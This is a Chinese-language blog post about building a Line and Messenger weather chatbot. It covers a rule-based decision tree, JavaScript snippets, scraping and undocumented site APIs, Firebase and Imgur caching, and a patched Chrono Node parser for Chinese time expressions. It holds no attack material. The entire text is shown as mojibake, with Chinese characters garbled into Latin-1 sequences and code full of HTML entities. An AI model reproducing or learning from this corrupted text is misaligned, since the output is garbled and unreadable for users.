æ©Ÿå™¨äººå›æ‡‰è¨­è¨ˆæ€è·¯åœ¨ç¹¼çºŒé–±è®€ä¹‹å‰ï¼Œå¸Œæœ›å¤§å®¶èƒ½å…ˆçœ‹é€™ç¯‡ã€ŒèŠå¤©æ©Ÿå™¨äººçš„é–‹ç™¼æ€è·¯ã€ï¼Œé€™ç¯‡æ–‡ç« ä»‹ç´¹äº†æ©Ÿå™¨äººå›æ‡‰çš„å¹¾ç¨®æ¨¡å¼ï¼Œä»¥åŠé©ç”¨æƒ…æ³ã€‚é‚£éº¼æ¥è‘—å°±æ˜¯è¦è€ƒæ…®æˆ‘åœ¨æ°£è±¡æ©Ÿå™¨äººä¸­ï¼Œè¦æ¡ç”¨ä¸‹åˆ—æ¨¡å‹çš„å“ªä¸€ç¨®äº†ï¼š

æ¨£æ¿å¼æ¨¡å‹ (Rule-based model)
æª¢ç´¢å¼æ¨¡å‹ (Retrieval-based model)
ç”Ÿæˆå¼æ¨¡å‹ (Generative model)

é€™å€‹æ™‚å€™å°±è¦æ€è€ƒä¸€ä¸‹ï¼Œä½¿ç”¨è€…æœƒå¦‚ä½•å°æ°£è±¡æ©Ÿå™¨äººèªªè©±ï¼Œä»¥åŠæ°£è±¡æ©Ÿå™¨äººæœƒå›æ‡‰ä»€éº¼è³‡è¨Šï¼Ÿ
ç°¡å–®èˆ‰ä¾‹çš„è©±ï¼Œå¤§å¤šæ•¸ä½¿ç”¨æƒ…å½¢å¯èƒ½å°±æ˜¯ï¼šã€Œæ˜å¤©æœƒä¸‹é›¨å—ï¼Ÿã€ã€ã€Œä»Šå¤©å¤©æ°£å¥½å—ã€ã€ã€Œæ˜å¤©æ°£è±¡é å ±ã€ã€ã€Œå°åŒ—å¤©æ°£å¦‚ä½•ã€ã€ã€Œå°å¤§ç¾åœ¨ç©ºæ°£å“è³ªæ€æ¨£ï¼Ÿã€ã€Œéœ€è¦å¸¶å‚˜å—ï¼Ÿã€ã€Œè¦æˆ´å£ç½©å—ï¼Ÿã€
ä¸Šé¢æˆ‘åˆ—å‡ºä¸€å€‹äººæƒ³å•å¤©æ°£çš„æ™‚å€™æœ€å¯èƒ½çš„å•å¥ï¼Œäº‹å¯¦ä¸Šå¦‚æœä½ æƒ³æŸ¥å¤©æ°£ï¼Œå¤§æ¦‚æœƒå° Google ä¸‹æœå°‹çš„å¥å­å°±æ˜¯é€™æ¨£ã€‚

ç°¡å–®åˆ†æä¸€ä¸‹ä¸Šé¢é€™äº›å•å¥ï¼Œæ¯å€‹å¥å­éƒ½æœ‰é—œéµå­—ï¼Œä¾‹å¦‚ï¼š

å¤©æ°£é—œéµå­—ï¼šã€Œå¤©æ°£ã€ã€ã€Œé å ±ã€ã€ã€Œç©ºæ°£å“è³ªã€
å¤©æ°£æŠ½è±¡åè©ï¼šã€Œå‚˜ã€ã€ã€Œå£ç½©ã€
æ™‚é–“é—œéµå­—ï¼šã€Œä»Šå¤©ã€ã€ã€Œæ˜å¤©ã€
åœ°é»é—œéµå­—ï¼šã€Œå°åŒ—ã€ã€ã€Œå°å¤§ã€

ä½ æœƒç™¼ç¾ï¼Œç•¶ä½ æƒ³è¦çŸ¥é“æ°£è±¡è³‡è¨Šæ™‚ï¼Œä¸€å€‹å¥å­çš„çµ„åˆå¤§æ¦‚å°±æ˜¯:
[åœ°é»][æ™‚é–“][å¤©æ°£é—œéµå­—ï½œå¤©æ°£æŠ½è±¡åè©]
åœ¨é€™å€‹æƒ…æ³ä¸‹ï¼Œæ°£è±¡æ©Ÿå™¨äººå…¶å¯¦åªéœ€è¦ç”¨æ¨£æ¿æ¨¡å‹å°±å¯ä»¥é”æˆéœ€æ±‚äº†ï¼Œä¸¦ä¸”ç²¾æº–åº¦ä¹Ÿå¯ä»¥é”åˆ°å¹¾ä¹ç™¾åˆ†ä¹‹ç™¾ã€‚å› ç‚ºåœ¨æŸ¥è©¢å¤©æ°£çš„æ™‚å€™ï¼Œæˆ‘å€‘ä¸éœ€è¦åˆ¤æ–·ä½¿ç”¨è€…çš„éš±æ™¦å«ç¾©ï¼Œæˆ–æ˜¯å¥å­æ˜¯æ­£å‘é‚„æ˜¯è² å‘å«ç¾©ï¼Œå› æ­¤ä¸éœ€è¦èªæ„åˆ†æã€æ©Ÿå™¨å­¸ç¿’ç­‰ç­‰æ–¹æ³•ä»‹å…¥ã€‚
æ­¤å¤–å³ä½¿æ˜¯å¤šè¼ªå°è©±çš„å½¢å¼ï¼Œé‚„æ˜¯å¯ä»¥åªé æ¨£ç‰ˆæ¨¡å‹å°±å¯ä»¥äº†ï¼Œæˆ‘å€‘å‰›å‰›æåˆ°ä¸‰è¦ç´ ï¼Œåœ°é»ã€æ™‚é–“ã€å¤©æ°£é—œéµå­—ï¼Œæ‰€ä»¥æœ€å¤šåªéœ€è¦ä¸‰è¼ªå°è©±ï¼Œä¾‹å¦‚ä½¿ç”¨è€…åªèªªäº†ã€Œå°åŒ—ã€ï¼Œæ©Ÿå™¨äººå°±å•ä»–èªªè¦å“ªå€‹ã€Œæ™‚é–“ã€ï¼Œå†å•ä»–èªªè¦çŸ¥é“ã€Œç©ºæ°£å“è³ªã€é‚„æ˜¯ã€Œå¤©æ°£ç‹€æ³ã€ã€‚
ä½†äº‹å¯¦ä¸Šï¼Œæ°£è±¡æ©Ÿå™¨äººå¤§å¤šæƒ…æ³åªéœ€è¦ä¸€è¼ªå°±å¤ äº†ã€‚å› ç‚ºå‡è¨­ä½¿ç”¨è€…åªèªªã€Œåœ°é»ã€ï¼Œé‚£æˆ‘å€‘å¯ä»¥é æœŸä»–å°±æ˜¯å•ç¾åœ¨ç‹€æ³ï¼Œé ‚å¤šä¸€é€±å¤©æ°£è¶¨å‹¢ã€‚ç•¶ä½¿ç”¨è€…åªèªªã€Œæ™‚é–“ã€æˆ–ã€Œå¤©æ°£é—œéµå­—ã€ï¼Œæˆ‘å€‘å¯ä»¥é æœŸåœ°é»æ˜¯ä»–ç™¼è¨Šæ¯çš„æ‰€åœ¨åœ°ã€‚
å› æ­¤å…¶å¯¦æ°£è±¡æ©Ÿå™¨äººä¸éœ€è¦å¤šè¼ªå¼å°è©±ï¼Œå› ç‚ºæŸ¥è©¢å¤©æ°£å°±æ˜¯ä¸€å€‹å¾ˆå–®ç´”çš„å‹•ä½œï¼Œå³ä¾¿ä½¿ç”¨è€…è¼¸å…¥ä¸¦æœªå¾—åˆ°æƒ³è¦çš„è³‡æ–™ï¼Œåªè¦é‡æ–°ä¸‹å¤ æ˜ç¢ºçš„å¥å­ï¼Œä¾‹å¦‚ã€Œä¸‹é€±äºŒç´ç´„æ°£è±¡é å ±ã€å°±å¯ä»¥å¾—åˆ°ç­”æ¡ˆã€‚
æ¨£æ¿å¼æ¨¡å‹å¯¦ä½œæ¨£ç‰ˆå¼æ¨¡å‹å…¶å¯¦æ„Ÿè¦ºä¹Ÿä»€éº¼æŠ€å·§ï¼Œä½†è¦æ³¨æ„æ¨£æ¿èƒ½æ‡‰ä»˜æ‰€æœ‰æƒ…æ³ã€‚æ­¤å¤–æ¨£æ¿æ¨¡å‹å…¶å¯¦å°±æ˜¯æ±ºç­–æ¨¹ï¼Œæ¡ç”¨æ™‚è¦æ³¨æ„è·¯å¾‘çš„è¨­è¨ˆï¼Œä¾‹å¦‚ä»¥å¤©æ°£æŸ¥è©¢ä¾†èªªï¼Œè·¯ç¶“æ‡‰è©²æ˜¯ã€Œå¤©æ°£é—œéµå­—ã€å„ªå…ˆåˆ¤æ–·ï¼Œæ‰æœƒé€²å…¥ã€Œåœ°é»ã€æˆ–ã€Œæ™‚é–“ã€çš„åˆ¤æ–·ã€‚ç•¶å¥å­åªæœ‰åœ°é»æˆ–æ™‚é–“æ™‚ï¼Œå‡è¨­æ˜¯ä¸€å°ä¸€æƒ…æ³ä¸‹ï¼Œä½¿ç”¨è€…åªèªªã€Œå°åŒ—ã€ï¼Œä½ å¤§æ¦‚èƒ½çŒœä»–æƒ³å•å°åŒ—å¤©æ°£ã€‚ä½†å› çˆ²æ©Ÿå™¨äººèƒ½åœ¨ç¾¤çµ„ä¸­ä½¿ç”¨ï¼Œé€™æ™‚å€™æœ‰æ˜ç¢ºçš„ã€Œå¤©æ°£é—œéµå­—ã€å‡ºç¾ï¼Œæ‰èƒ½æº–ç¢ºåšå‡ºå›æ‡‰ã€‚
ä¾‹å¦‚ä»¥ã€Œå¤©æ°£ã€æŒ‡ä»¤ä¾†èªªï¼Œæˆ‘çš„é‚è¼¯æ˜¯é€™æ¨£ï¼š
// ...// ä¸€äº›é è™•ç†ï¼ŒæŠ“åœ°é»ã€æ™‚é–“ã€æ°£è±¡é—œéµå­—ç­‰// ...&#125; else if (isWeatherKeyword) &#123;  // å¦‚æœæ˜¯è¦å›æ‡‰ã€Œå¤©æ°£ã€æ³ç‹€ï¼Œä¾‹å¦‚ï¼šå¤©æ°£ã€æ¿•åº¦ã€æº«åº¦    let replyMsg = &quot;&quot;; // å°‡å›å‚³çµ¦ä½¿ç”¨è€…çš„è³‡è¨Š    // ...    if (isTimeKeyword) &#123; // å¦‚æœæœ‰æ™‚é–“é—œéµå­—ï¼Œä¸¦ä¸”ä¸æ˜¯ç¾åœ¨ï¼Œå°±æ¡ç”¨é å ±        replyMsg = await getForecast(); // å–å¾—æ°£è±¡é å ±è³‡æ–™    &#125; else &#123; // ä¸ç„¶å°±å›ç­”ç¾åœ¨å¤©æ°£        replyMsg = await getWeather(); // å–å¾—ç¾åœ¨æ°£è±¡ç‹€æ³    &#125;    await platformReplyText(context, replyMsg); // å›å‚³çµ¦ Line æˆ– Messenger&#125; else if(/* å…¶ä»–æ°£è±¡é—œéµå­—ï¼Œä¾‹å¦‚ï¼šç©ºæ°£å“è³ªã€ */) &#123;// ....

æ‰€ä»¥å‡è¨­ä»Šå¤©å¥å­æ˜¯ã€Œå°åŒ—å¤©æ°£ã€ï¼Œå°±æœƒæ˜¯æ‰¾å°åŒ—ç¾åœ¨å¤©æ°£ã€‚å¦‚æœå¥å­æ˜¯ã€Œæ˜å¤©å°åŒ—å¤©æ°£ã€ï¼Œå°±æœƒå»æ‰¾æ°£è±¡é å ±çš„è³‡æ–™ã€‚ä½ å¯èƒ½æœƒå¥½å¥‡é‚£ã€Œåœ°é»ã€å‘¢ï¼Ÿå…¶å¯¦æˆ‘æ˜¯åœ¨ getForecast() å’Œ getWeather() å‡½æ•¸åº•ä¸‹æ‰è™•ç†åœ°é»ã€‚
æ±ºç­–æ¨¹çš„ç´°ç¯€æˆ‘å°±ä¸å¤šä½œä»‹ç´¹ï¼Œå¤§è‡´ä¸Šå°±æ˜¯ç”¨é€™æ¨£çš„åˆ¤æ–·æ–¹å¼æŠŠæ‰€æœ‰ä½¿ç”¨è€…å¯èƒ½æœƒä¸‹çš„å•å¥éƒ½è§£æä¸¦å›æ‡‰ã€‚
è³‡æ–™ä¾†æºä¸€å€‹æ°£è±¡æ©Ÿå™¨äººæœ€é‡è¦çš„éƒ¨åˆ†å°±æ˜¯æ°£è±¡è³‡æ–™äº†ï¼Œä¸€èˆ¬ä¾†èªªè³‡æ–™å–å¾—æœ‰å¹¾ç¨®æ–¹å¼ï¼š

çˆ¬èŸ²
å…¬é–‹ API
éš±è—ç‰ˆ API

çˆ¬èŸ²æ‰€è¬‚çˆ¬èŸ²å°±æ˜¯å»é–‹ç¶²é ï¼Œæ‰¾å‡ºç¶²é åŸå§‹ç¢¼ä¸­çš„è³‡æ–™ï¼Œä¸¦æ“·å–å‡ºä¾†ï¼Œä¾‹å¦‚æˆ‘å¯ä»¥å»æ‰¾æ°£è±¡å±€ç¶²ç«™ä¸­çš„æ°£æº«æ•¸å­—ï¼Œåœ¨åŸå§‹ç¢¼ä¸­å°±æœƒé•·é€™æ¨£ï¼š

å…¬é–‹ APIå…¬é–‹ API å°±æ˜¯ä¸€äº›é–‹æ”¾å¹³å°ï¼Œæˆ–æ˜¯å•†æ¥­æ©Ÿæ§‹ï¼Œæä¾›æ­£å¼çš„ API æœå‹™ï¼Œå¯ä»¥è—‰ç”±é€™äº› API å–å¾—ä½ è¦çš„è³‡æ–™ã€‚ä¾‹å¦‚ï¼š

æ°£è±¡è³‡æ–™é–‹æ”¾å¹³è‡ºï¼šæ°£è±¡å±€çš„å…¬é–‹è³‡æ–™
Open Weather Mapï¼šåœ‹å¤–çš„æ°£è±¡è³‡æ–™æœå‹™å•†

é‚„æœ‰å¾ˆå¤šï¼Œå°±ä¸å¤šåˆ—èˆ‰äº†ã€‚
éš±è—ç‰ˆ APIé€™å€‹æŠ€å·§é€šå¸¸åˆå­¸è€…éƒ½ä¸çŸ¥é“ï¼Œç‰¹åˆ¥ä»‹ç´¹ä¸€ä¸‹ã€‚å‰›å‰›æåˆ°èªªï¼Œçˆ¬èŸ²æ˜¯å»æŠ“ HTML çš„æ¬„ä½è³‡æ–™ï¼Œä½†æ˜¯å¾ˆå¤šæ™‚å€™ HTML æ˜¯é€é JS äº‹å¾Œè£œä¸Šå»çš„ã€‚æ˜¯çš„ï¼Œé€™å°±æ˜¯ MVC æ¡†æ¶ä¸‹çš„ç¶²ç«™æ¶æ§‹ã€‚ç¶²ç«™æœƒå…ˆæ¸²æŸ“ç‰ˆé¢ï¼Œç„¶å¾Œå†ç”± HTTP Request å‘¼å«ä»–è‡ªå·±çš„ API å–å¾—å‰©ä¸‹çš„è³‡æ–™ï¼Œä¸¦ç”¨ JS æŠŠè³‡æ–™è£œåˆ°æ¸²æŸ“ç•«é¢ä¸Šã€‚
æ‰€ä»¥æˆ‘å€‘è¦åšçš„äº‹æƒ…å°±æ˜¯ï¼Œæ””æˆªç¶²ç«™è‡ªå·±çš„ APIï¼Œé€™äº› API ä¸æ˜¯å…¬é–‹çš„ï¼Œä½†æ˜¯æˆ‘å€‘ä¹Ÿå¯ä»¥æ‹¿ä¾†ç”¨ã€‚ä¸éé¢¨éšªæ˜¯ï¼Œå› ç‚ºé€™äº› API ä¸æ˜¯å°å¤–å…¬é–‹çš„ï¼Œå¯èƒ½ç”¨æ³•æˆ–æ˜¯åç¨±å¸¸å¸¸å†æ”¹è®Šã€‚

ä»¥ä¸Šåœ–ç‚ºä¾‹ï¼ŒBreezo Meter æ˜¯ä¸€å€‹å¯ä»¥æŸ¥ç©ºæ°£å“è³ªçš„ç¶²ç«™ï¼Œæˆ‘æƒ³çœ‹çœ‹å®ƒæ˜¯ä¸æ˜¯æœ‰è‡ªå·±çš„ APIï¼Œæ‰€ä»¥æˆ‘æ‰“è©²ç¶²é ï¼Œç„¶å¾Œé–‹å•Ÿã€Œé–‹ç™¼è€…å·¥å…·ã€ï¼Œé»é–‹ã€Œç¶²è·¯ã€ç„¶å¾Œé¸ã€ŒXHRã€ã€‚
é€™æ™‚å€™æˆ‘å€‘æœƒçœ‹åˆ°æœ‰å¥½å¹¾ç­†è³‡æ–™ï¼Œæˆ‘å°±æ¯ä¸€ç­†éƒ½é»é–‹çœ‹çœ‹ï¼Œç„¶å¾Œçœ‹ã€Œå›æ‡‰ã€çš„éƒ¨åˆ†ï¼Œæ‰€è¬‚å›æ‡‰å°±æ˜¯ HTTP Request çš„ Responseï¼Œå¦‚æœä»–æ˜¯ä¸€éš» APIï¼Œå°±æœƒçœ‹åˆ° Json æ ¼å¼çš„è³‡æ–™ï¼Œç„¶å¾Œæˆ‘å€‘å°±æˆåŠŸæ””æˆª API äº†ï¼æˆ‘å€‘å°±å¯ä»¥ç›´æ¥ä½¿ç”¨éš±è—ç‰ˆ API ä¾†å–å¾—è³‡æ–™ï¼Œé€šå¸¸æœƒæ¯”å¯«çˆ¬èŸ²é‚„æ–¹ä¾¿ï¼Œä½†é¢¨éšªå°±æ˜¯ä»–å¯èƒ½éš¨æ™‚æœƒè®Šã€‚
è³‡æ–™è™•ç†è³‡æ–™åº«æˆ‘æœ‰å…©å°ä¼ºæœå™¨åˆ†åˆ¥è™•ç†ä¸åŒèŠå¤©å¹³å°ï¼Œä½†è³‡æ–™åº«æ‡‰è©²è¦å…±ç”¨ï¼Œæ‰€ä»¥æŠŠè³‡æ–™éƒ¨åˆ†ç¨ç«‹å‡ºä¾†ã€‚è³‡æ–™åº«éƒ¨åˆ†æˆ‘ä½¿ç”¨ Firebaseï¼Œå› ç‚º Firebase ä¸éœ€è¦å»ç®¡ä¼ºæœå™¨çš„å•é¡Œï¼Œæ¯”èµ·æˆ‘è‡ªå·±åœ¨å¼„ä¸€å°å°ˆé–€çš„è³‡æ–™åº«ä¼ºæœå™¨æ–¹ä¾¿ã€‚
è³‡æ–™åº«ä¸»è¦æ˜¯ç”¨ä¾†è¨˜éŒ„ä¸€äº›é«˜æˆæœ¬çš„è³‡è¨Šï¼Œä¾‹å¦‚ã€Œç©ºæ°£å“è³ªçš„åœ–ã€å…¶å¯¦æ˜¯å…©å¼µåœ–ç‰‡åˆæˆï¼Œæ¯æ¬¡æœ‰ä½¿ç”¨è€…æŸ¥è©¢éƒ½åˆæˆä¸€æ¬¡å¾ˆæµªè²»è³‡æºï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€ä½ä½¿ç”¨è€…æŸ¥è©¢æ™‚ï¼Œè·‘éä¸€æ¬¡å½±åƒè™•ç†å°±æŠŠä»–å­˜èµ·ä¾†ï¼Œåœ¨åŒæ™‚é–“å…§æœ‰å…¶ä»–æŸ¥è©¢å°±ç›´æ¥èª¿ç”¨è³‡æ–™åº«ã€‚
é€™é‚Šå¯èƒ½æœƒæœ‰å•é¡Œï¼Œç‚ºä»€éº¼ä¸ç”¨ä¼ºæœå™¨å®šæ™‚è·‘è³‡æ–™å­˜åˆ°è³‡æ–™åº«ï¼Ÿé€™æ˜¯å› ç‚ºç›®å‰ä½¿ç”¨è€…å¤§ç´„ä¸€åƒï¼ŒæŸ¥è©¢é »ç‡å…¶å¯¦æ²’æœ‰åˆ°å¾ˆé«˜ï¼Œæ‰€ä»¥æƒ³èªªæ„›åœ°çƒï¼Œæœ‰éœ€è¦å†è·‘å°±å¥½ã€‚
ä¸€èˆ¬åšæ³•éƒ½æ˜¯æŠŠæ‰€æœ‰å¯èƒ½æœƒèª¿ç”¨çš„è³‡æ–™éƒ½ç”¨å›ºå®šæ’æˆå…ˆè·‘å¥½ï¼Œåƒæ˜¯çˆ¬èŸ²ã€èª¿ç”¨ APIã€åœ–ç‰‡è™•ç†ç­‰ç­‰éƒ½æ¯éš”ä¸€æ®µæ™‚é–“è‡ªå‹•åŸ·è¡Œä¸¦å„²å­˜ï¼Œåªæ˜¯æˆ‘è¦ºå¾—ä½¿ç”¨é‡é‚„æ²’é‚£éº¼å¤§æ‰€ä»¥æ²’é€™æ¨£åšã€‚
åœ–ç‰‡æ°£è±¡æ©Ÿå™¨äººå¯ä»¥ç›´æ¥ä¸‹é—œéµå­—å¾—åˆ°å¤©æ°£åœ–ã€è¡›æ˜Ÿåœ–ã€é å ±åœ–ç­‰ï¼Œç”šè‡³æˆ‘é€£åœ°éœ‡åœ–éƒ½æ”¯æ´ã€‚ä½†æ˜¯ Line è¦å®šåœ–ç‰‡ä¾†æºè¦æ˜¯ HTTPSï¼Œå¾ˆéºæ†¾ä¸­å¤®æ°£è±¡å±€åªæœ‰ HTTPï¼Œæ‰€ä»¥æˆ‘å¿…é ˆå…ˆæŠŠåœ–ç‰‡å‚³çµ¦ç¬¬ä¸‰æ–¹åœ–ç‰‡æœå‹™å•†ï¼Œé€™é‚Šæˆ‘æ˜¯ç”¨ Imgurã€‚ç„¶å¾Œå†æŠŠä¸Šå‚³ Imgur çš„åœ–ç‰‡å‚³åˆ° Line ä¸Šã€‚å› ç‚ºåœ–ç‰‡è½‰ä»‹å¾ˆèŠ±æ™‚é–“ï¼Œè€Œä¸”åŒä¸€å¼µåœ–ç‰‡å…¶å¯¦å¯ä»¥å†åˆ©ç”¨ï¼Œæ‰€ä»¥æœ€å¾Œå‚³åˆ° Imgur çš„åœ–ç‰‡éƒ½æœƒç”¨ Firebase è¨˜éŒ„èµ·ä¾†ã€‚
æ°£è±¡è³‡æ–™åŸå§‹æ°£è±¡è³‡æ–™å¯èƒ½æœƒéœ€è¦è™•ç†ï¼Œä¾‹å¦‚:

é«”æ„Ÿæº«åº¦å¿…é ˆè‡ªå·±å¾æ¸¬ç«™è³‡æ–™å»ç®—
é¢¨å‘éƒ½æ˜¯æ•¸å­—ï¼Œè¦è½‰æˆæ–¹ä½
ç©ºæ°£å“è³ªå¥½å£æŒ‡æ¨™ AQI æ˜¯æ•¸å€¼ï¼Œè¦è½‰æ›æˆæè¿°æ–‡å­—ä¾‹å¦‚ã€Œå°éæ•æ—ç¾¤ä¸å¥åº·ã€

ç°¡å–®æ˜ç­åœ°æŠŠæ•¸æ“šå‘ˆç¾çµ¦ä½¿ç”¨è€…ä¹Ÿå¾ˆé‡è¦ã€‚
é—œéµå­—çš„è™•ç†æ™‚é–“è¦èƒ½è¾¨è­˜å¥å­çš„æ™‚é–“ï¼Œæ‰èƒ½çŸ¥é“è¦çµ¦å“ªå€‹æ™‚é–“çš„è³‡æ–™ï¼Œæ‰€ä»¥æ©Ÿå™¨äººè¦èƒ½è¾¨è­˜ã€Œæ˜å¤©æ™šä¸Šã€ã€ã€Œä»Šå¤© 20:00ã€ã€ã€Œæ˜å¤© 6:30pmã€é€™é¡çš„æ™‚é–“èªå¥ã€‚
é€™é‚Šæˆ‘æ¡ç”¨ Chrono Nodeï¼Œä»–è¾¨è­˜çš„èƒ½åŠ›çœŸçš„æ»¿ä¸éŒ¯çš„ï¼Œè€Œä¸”æ”¯æ´è‹±æ–‡ä¸­æ–‡æ··é›œã€‚ä¸éæˆ‘å¾Œä¾†ç™¼ç¾ä»–ä¸­æ–‡æ”¯æ´åº¦ä¸å®Œæ•´ï¼Œä¾‹å¦‚ä¸­æ–‡çš„ã€Œå‰å¤©ã€ã€ã€Œå¾Œå¤©ã€ã€ã€Œå¤§å¾Œå¤©ã€ä¸¦ä¸æ”¯æ´ï¼Œæ‰€ä»¥æˆ‘æœ‰å¹«å¿™å¯«è£œä¸ï¼Œä¸éç™¼ Pull Request ä¹‹å¾Œä½œè€…ä¸€ç›´æ²’æœ‰å›æ‡‰ï¼Œæ„Ÿè¦ºæ˜¯æ²’åœ¨ç¶­è­·äº†ã€‚æ‰€ä»¥æ°£è±¡æ©Ÿå™¨äººæ˜¯å®‰è£æˆ‘è‡ªå·±ä¿®æ”¹éçš„ fork ç‰ˆæœ¬ã€‚
Chrono è™•ç†ä¸­æ–‡æ™‚é–“æ–¹æ³•æˆ‘è¦ºå¾—æ»¿ä¸éŒ¯çš„ï¼Œé€™é‚Šç°¡å–®ç¤ºä¾‹ï¼š
ç”±æ–¼ä¸­æ–‡è¡¨ç¤ºæ™‚é–“çš„çµ„åˆå°±é‚£éº¼å¤šï¼Œæ‰€ä»¥å…¨éƒ¨åˆ—å‡ºä¾†ã€‚
var PATTERN = new RegExp(    &#x27;(è€Œå®¶|ç«‹(?:åˆ»|å³)|å³åˆ»)|&#x27; +    &#x27;(ä»Š|æ˜|å‰|å¤§å‰|å¾Œ|å¤§å¾Œ|è½|æ˜¨|å°‹|ç´)(æ—©|æœ|æ™š)|&#x27; +    &#x27;(ä¸Š(?:åˆ|æ™)|æœ(?:æ—©)|æ—©(?:ä¸Š)|ä¸‹(?:åˆ|æ™)|æ™(?:æ™)|æ™š(?:ä¸Š)|å¤œ(?:æ™š)?|ä¸­(?:åˆ)|å‡Œ(?:æ™¨))|&#x27; +    &#x27;(ä»Š|æ˜|å‰|å¤§å‰|å¾Œ|å¤§å¾Œ|è½|æ˜¨|å°‹|ç´)(?:æ—¥|å¤©)&#x27; +    &#x27;(?:[\\s|,|ï¼Œ]*)&#x27; +    &#x27;(?:(ä¸Š(?:åˆ|æ™)|æœ(?:æ—©)|æ—©(?:ä¸Š)|ä¸‹(?:åˆ|æ™)|æ™(?:æ™)|æ™š(?:ä¸Š)|å¤œ(?:æ™š)?|ä¸­(?:åˆ)|å‡Œ(?:æ™¨)))?&#x27;, &#x27;i&#x27;);

æ ¹æ“šä¸­æ–‡æè¿°è½‰æ›æˆæ™‚é–“æ¦‚å¿µã€‚
// .....&#125; else if (match[DAY_GROUP_1]) &#123; // è™•ç†ä¸­æ–‡å­—æœ‰é—œæ–¼ã€Œå¤©ã€çš„éƒ¨åˆ†    var day1 = match[DAY_GROUP_1];    var time1 = match[TIME_GROUP_1];    if (day1 == &#x27;æ˜&#x27; || day1 == &#x27;è½&#x27;) &#123;        // å¦‚æœåŠå¤œèªªæ˜å¤©ï¼Œé€šå¸¸æ˜¯ä»Šå¤©çš„æ¦‚å¿µ        if(refMoment.hour() &gt; 1) &#123;            startMoment.add(1, &#x27;day&#x27;);        &#125;    &#125; else if (day1 == &#x27;æ˜¨&#x27; || day1 == &#x27;å°‹&#x27; || day1 == &#x27;ç´&#x27;) &#123;        startMoment.add(-1, &#x27;day&#x27;);    &#125; else if (day1 == &quot;å‰&quot;)&#123;        startMoment.add(-2, &#x27;day&#x27;);    &#125; else if (day1 == &quot;å¤§å‰&quot;)&#123;        startMoment.add(-3, &#x27;day&#x27;);    &#125; else if ( day1 == &quot;å¾Œ&quot;)&#123;        startMoment.add(2, &#x27;day&#x27;);    &#125; else if (day1 == &quot;å¤§å¾Œ&quot;)&#123;        startMoment.add(3, &#x27;day&#x27;);    &#125;    if (time1 == &#x27;æ—©&#x27; || time1 == &#x27;æœ&#x27;) &#123;        result.start.imply(&#x27;hour&#x27;, 6);    &#125; else if (time1 == &#x27;æ™š&#x27;) &#123;        result.start.imply(&#x27;hour&#x27;, 22);        result.start.imply(&#x27;meridiem&#x27;, 1);&#125; else if (match[TIME_GROUP_2]) &#123; // è™•ç†ä¸­æ–‡å­—æœ‰é—œæ–¼ã€Œæ™‚ã€çš„éƒ¨åˆ†

ä¸Šé¢åªæ˜¯ä¸­æ–‡è™•ç†çš„éƒ¨ä»½è€Œå·²ï¼Œå¯ä»¥æŠŠã€Œæ˜å¤©æ™šä¸Šã€ã€ã€Œå¾Œå¤©æ—©ä¸Šã€ç­‰æ™‚é–“æ¦‚å¿µè½‰æ›æˆ Date() ç‰©ä»¶ã€‚æ­¤å¤– Chrono æœ€å¥½ç”¨çš„éƒ¨åˆ†æ˜¯ä¸åŒèªè¨€çš„æ¨¡çµ„äº’é€šï¼Œæ‰€ä»¥å¯ä»¥æ··æ­ä¾‹å¦‚ã€Œæ˜å¤© 8:00pmã€ã€‚ä¸­æ–‡æ•¸å­—è™•ç†ä»¥åŠè‹±æ–‡æ™‚é–“åˆ¤æ–·å°±ç•™çµ¦è®€è€…è‡ªè¡Œå»çœ‹åŸå§‹ç¢¼å›‰ï¼
æ­¤å¤–åœ¨é–‹ç™¼éç¨‹ä¸­æˆ‘è¢«ã€Œæ™‚é–“ã€æŠ˜é¨°å€‹åŠæ­»ï¼Œå› ç‚ºä¼ºæœå™¨åœ¨ç¾åœ‹ï¼Œä½¿ç”¨è€…æ‡‰è©²æ˜¯åœ¨å°ç£ï¼ˆå¾ˆä¸åš´è¬¹çš„å‡è¨­ï¼Œæˆ‘é‚„æ²’å»ç ”ç©¶å¦‚ä½•å¾ line æˆ– messenger ä¸­å–å¾—ä½¿ç”¨è€…æ™‚å€ï¼‰ï¼Œä¸­å¤®æ°£è±¡å±€è³‡æ–™æ™‚é–“æ˜¯å°ç£æ™‚é–“ï¼Œæ‰€ä»¥è¦ä¸€ç›´è½‰æ›ä¾†æ¯”å°æ™‚é–“ã€‚
è½‰æ›æ™‚é–“çœŸçš„æ˜¯æšˆé ­è½‰å‘ï¼š

ä¼ºæœå™¨æ”¶åˆ°è¨Šæ¯ï¼Œè¦åˆ¤æ–·å¥å­ä¸­çš„æ™‚é–“ï¼Œç„¶å¾Œå‡è¨­ä½¿ç”¨è€…æ˜¯åœ¨å°ç£ï¼Œä»¥æ­¤æ›æˆ UTC æ¨™æº–æ™‚é–“ã€‚
å†å°‡ä¼ºæœå™¨æ™‚é–“ä¹Ÿè½‰æˆ UTC æ¨™æº–æ™‚é–“ï¼Œæ¯”è¼ƒå¥å­æ™‚é–“èˆ‡ä¼ºæœå™¨æ™‚é–“ï¼Œæª¢æŸ¥æ™‚é–“æ˜¯å¦åœ¨æœªä¾†ã€‚
æ˜¯æœªä¾†å°±å»æ’ˆæ°£è±¡å±€é å ±è³‡æ–™ï¼Œä¸¦å°‡æ°£è±¡å±€è³‡æ–™è½‰æˆ UTC æ¨™æº–æ™‚é–“ï¼Œæ‰¾å‡ºèˆ‡å¥å­æ™‚é–“ç¬¦åˆçš„æ°£è±¡æ•¸æ“šã€‚

æ­¤å¤– NodeJS çš„åœ‹éš›åŒ–å…ƒä»¶ï¼ˆICUï¼‰åŸä¾†é è¨­æ˜¯è£ small-icuï¼Œæƒ³è¦å®Œæ•´çš„è©±è¦è£ full-icuã€‚åœ‹éš›åŒ–å…ƒä»¶å¯ä»¥è®“æ™‚é–“è¡¨é”æˆä¸­æ–‡ï¼ŒåŸæœ¬ NodeJS æœƒç›´æ¥å°‡æ™šä¸Šå…«é»è¡¨é”æˆ 20:00ï¼Œä½†æ˜¯å®Œæ•´çš„åœ‹éš›åŒ–å…ƒä»¶å¯ä»¥è®“ä»–è¡¨ç¤ºæˆ ä¸‹åˆ 8:00ã€‚
npm install full-icu --save

åŸ·è¡Œ NodeJS çš„æ™‚å€™è¦é€™æ¨£ä¾†ä½¿ç”¨å®Œæ•´çš„åœ‹éš›åŒ–å…ƒä»¶ï¼š
node --icu-data-dir=./node_modules/full-icu index.js

